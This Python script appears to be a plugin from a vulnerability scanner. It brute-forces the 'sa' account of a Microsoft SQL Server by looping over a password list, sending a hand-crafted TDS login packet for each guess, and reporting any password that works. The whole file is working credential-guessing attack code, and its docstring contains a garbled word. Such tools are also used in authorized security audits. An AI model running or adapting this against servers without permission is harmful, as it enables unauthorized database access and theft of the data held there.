#!/usr/bin/env python3

'''
name: Mssql 弱口令漏洞

descrself.hosttion: Mssql 弱口令漏洞
'''

import socket
import binascii
from urllib.parse import urlparse

class Mssql_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.url = url
        url_parse = urlparse(self.url)
        self.host = url_parse.hostname
        self.port = url_parse.port
        if not self.port:
            self.port = '1433'
        self.data = '0200020000000000123456789000000000000000000000000000000000000000000000000000ZZ5440000000000000000000000000000000000000000000000000000000000X3360000000000000000000000000000000000000000000000000000000000Y373933340000000000000000000000000000000000000000000000000000040301060a09010000000002000000000070796d7373716c000000000000000000000000000000000000000000000007123456789000000000000000000000000000000000000000000000000000ZZ3360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000Y0402000044422d4c6962726172790a00000000000d1175735f656e676c69736800000000000000000000000000000201004c000000000000000000000a000000000000000000000000000069736f5f31000000000000000000000000000000000000000000000000000501353132000000030000000000000000'

    def run(self):
        for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
            if pwd != '':
                pwd = pwd.strip()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, int(self.port)))
                husername = binascii.b2a_hex('sa'.encode('utf-8'))
                lusername = len('sa')
                lpassword = len(pwd)
                hpwd = binascii.b2a_hex(pwd.encode('utf-8'))
                address = binascii.b2a_hex(self.host.encode('utf-8')) +'3a'.encode('utf-8')+ binascii.b2a_hex(str(self.port).encode('utf-8'))
                data1 = self.data.replace(self.data[16:16+len(address.decode('utf-8'))], address.decode('utf-8'))
                data2 = data1.replace(data1[78:78+len(husername.decode('utf-8'))], husername.decode('utf-8'))
                data3 = data2.replace(data2[140:140+len(hpwd.decode('utf-8'))], hpwd.decode('utf-8'))
                if lusername >= 16:
                    data4 = data3.replace('0X', str(hex(lusername)).replace('0x', ''))
                else:
                    data4 = data3.replace('X', str(hex(lusername)).replace('0x', ''))
                if lpassword >= 16:
                    data5 = data4.replace('0Y', str(hex(lpassword)).replace('0x', ''))
                else:
                    data5 = data4.replace('Y', str(hex(lpassword)).replace('0x', ''))
                hladd = hex(len(self.host) + len(str(1433))+1).replace('0x', '')
                data6 = data5.replace('ZZ', str(hladd))
                data7 = binascii.a2b_hex(data6)
                s.send(data7)
                if 'master' in s.recv(1024).decode('utf-8'):
                    print('存在SQLserver弱口令,弱口令为:', pwd)
                    return True
            except Exception as e:
                print(e)
                pass
            finally:
                s.close()
        print('不存在Mssql弱口令')
        return False
if  __name__ == "__main__":
    Mssql_Weakpwd = Mssql_Weakpwd_BaseVerify('http://127.0.0.1')
    Mssql_Weakpwd.run()